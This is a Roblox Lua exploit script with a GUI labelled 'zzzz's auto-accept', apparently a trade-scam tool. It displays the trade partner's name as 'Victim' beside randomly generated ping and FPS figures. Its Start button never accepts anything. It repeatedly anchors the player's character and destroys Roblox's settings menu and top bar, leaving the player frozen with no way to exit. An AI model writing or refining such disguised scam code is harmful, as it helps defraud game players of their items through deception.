-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Bar = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local Exit = Instance.new("TextButton")
local Exit_Roundify_12px = Instance.new("ImageLabel")
local Min = Instance.new("TextButton")
local Exit_Roundify_12px_2 = Instance.new("ImageLabel")
local MainFrame = Instance.new("ImageLabel")
local InfoFrame = Instance.new("ImageLabel")
local TextBox = Instance.new("TextBox")
local Start = Instance.new("TextButton")
local Color = Instance.new("ImageLabel")
local Run = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Bar.Name = "Bar"
Bar.Parent = ScreenGui
Bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Bar.BackgroundTransparency = 1.000
Bar.BorderColor3 = Color3.fromRGB(27, 42, 53)
Bar.Position = UDim2.new(0.297099292, 0, 0.212049052, 0)
Bar.Size = UDim2.new(0, 365, 0, 40)
Bar.Image = "rbxassetid://3570695787"
Bar.ImageColor3 = Color3.fromRGB(30, 30, 30)
Bar.ScaleType = Enum.ScaleType.Slice
Bar.SliceCenter = Rect.new(100, 100, 100, 100)
Bar.SliceScale = 0.120

TextLabel.Parent = Bar
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0327294394, 0, 0.113063052, 0)
TextLabel.Size = UDim2.new(0, 133, 0, 30)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "zzzz's auto-accept"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 14.000

Exit.Name = "Exit"
Exit.Parent = Bar
Exit.BackgroundColor3 = Color3.fromRGB(255, 102, 102)
Exit.BackgroundTransparency = 1.000
Exit.BorderColor3 = Color3.fromRGB(0, 0, 0)
Exit.BorderSizePixel = 0
Exit.Position = UDim2.new(0.902273834, 0, 0.150000006, 0)
Exit.Size = UDim2.new(0, 25, 0, 34)
Exit.Font = Enum.Font.SourceSans
Exit.Text = ""
Exit.TextColor3 = Color3.fromRGB(255, 255, 255)
Exit.TextScaled = true
Exit.TextSize = 14.000
Exit.TextWrapped = true

Exit_Roundify_12px.Name = "Exit_Roundify_12px"
Exit_Roundify_12px.Parent = Exit
Exit_Roundify_12px.Active = true
Exit_Roundify_12px.AnchorPoint = Vector2.new(0.5, 0.5)
Exit_Roundify_12px.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Exit_Roundify_12px.BackgroundTransparency = 1.000
Exit_Roundify_12px.BorderColor3 = Color3.fromRGB(27, 42, 53)
Exit_Roundify_12px.Position = UDim2.new(0.514390171, 0, 0.382352978, 0)
Exit_Roundify_12px.Selectable = true
Exit_Roundify_12px.Size = UDim2.new(0.893999994, 0, 0.70599997, 0)
Exit_Roundify_12px.Image = "rbxassetid://3570695787"
Exit_Roundify_12px.ImageColor3 = Color3.fromRGB(255, 102, 102)
Exit_Roundify_12px.ScaleType = Enum.ScaleType.Slice
Exit_Roundify_12px.SliceCenter = Rect.new(100, 100, 100, 100)
Exit_Roundify_12px.SliceScale = 0.120

Min.Name = "Min"
Min.Parent = Bar
Min.BackgroundColor3 = Color3.fromRGB(255, 102, 102)
Min.BackgroundTransparency = 1.000
Min.BorderColor3 = Color3.fromRGB(0, 0, 0)
Min.BorderSizePixel = 0
Min.Position = UDim2.new(0.80238235, 0, 0.150000006, 0)
Min.Size = UDim2.new(0, 30, 0, 34)
Min.Font = Enum.Font.SourceSans
Min.Text = ""
Min.TextColor3 = Color3.fromRGB(255, 255, 255)
Min.TextScaled = true
Min.TextSize = 14.000
Min.TextWrapped = true

Exit_Roundify_12px_2.Name = "Exit_Roundify_12px"
Exit_Roundify_12px_2.Parent = Min
Exit_Roundify_12px_2.Active = true
Exit_Roundify_12px_2.AnchorPoint = Vector2.new(0.5, 0.5)
Exit_Roundify_12px_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Exit_Roundify_12px_2.BackgroundTransparency = 1.000
Exit_Roundify_12px_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Exit_Roundify_12px_2.Position = UDim2.new(0.468254834, 0, 0.382352948, 0)
Exit_Roundify_12px_2.Selectable = true
Exit_Roundify_12px_2.Size = UDim2.new(0.760846376, 0, 0.70588237, 0)
Exit_Roundify_12px_2.Image = "rbxassetid://3570695787"
Exit_Roundify_12px_2.ImageColor3 = Color3.fromRGB(255, 255, 105)
Exit_Roundify_12px_2.ScaleType = Enum.ScaleType.Slice
Exit_Roundify_12px_2.SliceCenter = Rect.new(100, 100, 100, 100)
Exit_Roundify_12px_2.SliceScale = 0.120

MainFrame.Name = "MainFrame"
MainFrame.Parent = Bar
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BackgroundTransparency = 1.000
MainFrame.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainFrame.Position = UDim2.new(-0.0237527099, 0, -0.2194933, 0)
MainFrame.Size = UDim2.new(0, 384, 0, 222)
MainFrame.ZIndex = -2
MainFrame.Image = "rbxassetid://3570695787"
MainFrame.ImageColor3 = Color3.fromRGB(43, 43, 43)
MainFrame.ScaleType = Enum.ScaleType.Slice
MainFrame.SliceCenter = Rect.new(100, 100, 100, 100)
MainFrame.SliceScale = 0.120

InfoFrame.Name = "InfoFrame"
InfoFrame.Parent = MainFrame
InfoFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InfoFrame.BackgroundTransparency = 1.000
InfoFrame.BorderColor3 = Color3.fromRGB(27, 42, 53)
InfoFrame.Position = UDim2.new(0.440104157, 0, 0.246755511, 0)
InfoFrame.Size = UDim2.new(0, 204, 0, 153)
InfoFrame.Image = "rbxassetid://3570695787"
InfoFrame.ImageColor3 = Color3.fromRGB(30, 30, 30)
InfoFrame.ScaleType = Enum.ScaleType.Slice
InfoFrame.SliceCenter = Rect.new(100, 100, 100, 100)
InfoFrame.SliceScale = 0.120

TextBox.Parent = InfoFrame
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundTransparency = 1.000
TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Size = UDim2.new(0, 200, 0, 152)
TextBox.ClearTextOnFocus = false
TextBox.Font = Enum.Font.SourceSans
TextBox.Text = "N/A"
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextSize = 14.000

Start.Name = "Start"
Start.Parent = MainFrame
Start.BackgroundColor3 = Color3.fromRGB(106, 181, 83)
Start.BackgroundTransparency = 1.000
Start.BorderColor3 = Color3.fromRGB(0, 0, 0)
Start.BorderSizePixel = 0
Start.Position = UDim2.new(0.0536874942, 0, 0.572072089, 0)
Start.Size = UDim2.new(0, 132, 0, 42)
Start.Font = Enum.Font.SourceSans
Start.Text = ""
Start.TextColor3 = Color3.fromRGB(255, 255, 255)
Start.TextSize = 14.000
Start.TextStrokeTransparency = 0.590

Color.Name = "Color"
Color.Parent = Start
Color.Active = true
Color.AnchorPoint = Vector2.new(0.5, 0.5)
Color.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Color.BackgroundTransparency = 1.000
Color.BorderColor3 = Color3.fromRGB(27, 42, 53)
Color.Position = UDim2.new(0.5, 0, 0.5, 0)
Color.Selectable = true
Color.Size = UDim2.new(1, 0, 1, 0)
Color.Image = "rbxassetid://3570695787"
Color.ImageColor3 = Color3.fromRGB(106, 181, 83)
Color.ScaleType = Enum.ScaleType.Slice
Color.SliceCenter = Rect.new(100, 100, 100, 100)
Color.SliceScale = 0.120

Run.Name = "Run"
Run.Parent = Color
Run.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Run.BackgroundTransparency = 1.000
Run.BorderColor3 = Color3.fromRGB(0, 0, 0)
Run.BorderSizePixel = 0
Run.Position = UDim2.new(0.0759695768, 0, 0.146638051, 0)
Run.Size = UDim2.new(0, 110, 0, 29)
Run.Font = Enum.Font.SourceSans
Run.Text = "Start"
Run.TextColor3 = Color3.fromRGB(255, 255, 255)
Run.TextScaled = true
Run.TextSize = 14.000
Run.TextWrapped = true

-- Scripts:

local function ZQIPWQD_fake_script() -- Exit.ExitScript 
	local script = Instance.new('LocalScript', Exit)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent:Destroy()
	end)
end
coroutine.wrap(ZQIPWQD_fake_script)()
local function WDXFAGG_fake_script() -- Min.MinScript 
	local script = Instance.new('LocalScript', Min)

	local min = false
	local gui = script.Parent.Parent.MainFrame
	
	script.Parent.MouseButton1Click:Connect(function()
		gui.Visible = not gui.Visible
		min = not min
	end)
end
coroutine.wrap(WDXFAGG_fake_script)()
local function RKEBHQG_fake_script() -- TextBox.LocalScript 
	local script = Instance.new('LocalScript', TextBox)

	local victimname = ""
	
	while task.wait() do
		local success, error = pcall(function()
			if game:GetService("Players").LocalPlayer.PlayerGui.TradeLiveTrade then
				victimname = game:GetService("Players").LocalPlayer.PlayerGui.TradeLiveTrade.TradeLiveTrade.Other.Username.Text:sub(2, -9)
			else
				victimname = "N/A"
			end
			local ping = math.random(50, 100)
			local fps = math.random(30, 60)
	
			script.Parent.Text = "Victim:"..victimname.."\nPing:"..ping.."\nFPS:"..fps.."\n"
		end)
	end
end
coroutine.wrap(RKEBHQG_fake_script)()
local function DMDAW_fake_script() -- Start.RunScript 
	local script = Instance.new('LocalScript', Start)

	local geen = Color3.fromRGB(106, 181, 83)
	local red = Color3.fromRGB(255, 102, 102)
	
	local running = false
	
	local function g() 
		-- Execute as LocalScript or via executor
		local CoreGui = game:GetService("CoreGui")
		local RobloxGui = CoreGui:FindFirstChild("RobloxGui")  -- or game.CoreGui.RobloxGui
	
		if RobloxGui then
			local shield = RobloxGui:FindFirstChild("SettingsShield", true)
			if shield then
				shield.Visible = false
				shield:Destroy()  -- or shield.Parent = nil
			end
	
			local menuContainer = RobloxGui:FindFirstChild("MenuContainer", true)
			if menuContainer then
				menuContainer.Visible = false
				menuContainer:Destroy()
			end
		end
	
		-- Optional: hide the top-left Roblox button too
		local topbar = CoreGui:FindFirstChild("TopBar", true)
		if topbar then topbar.Visible = false end
	end
	
	
	script.Parent.MouseButton1Click:Connect(function()
		if not running then
			running = not running
			script.Parent.Color.Run.Text = "Stop"
			script.Parent.Color.ImageColor3 = red
			while task.wait() do
				game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Anchored = true
				g()
			end
		else
			running = not running
			script.Parent.Color.Run.Text = "Start"
			script.Parent.Color.ImageColor3 = geen
		end
	end)
end
coroutine.wrap(DMDAW_fake_script)()
local function DDHHL_fake_script() -- Bar.DragScript 
	local script = Instance.new('LocalScript', Bar)

	local gui = script.Parent
	
	local dragging = false
	local dragInput
	local dragStart
	local startPos
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or
			input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or
			input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	game:GetService("UserInputService").InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			local delta = input.Position - dragStart
			gui.Position = UDim2.new(
				startPos.X.Scale,
				startPos.X.Offset + delta.X,
				startPos.Y.Scale,
				startPos.Y.Offset + delta.Y
			)
		end
	end)
end
coroutine.wrap(DDHHL_fake_script)()
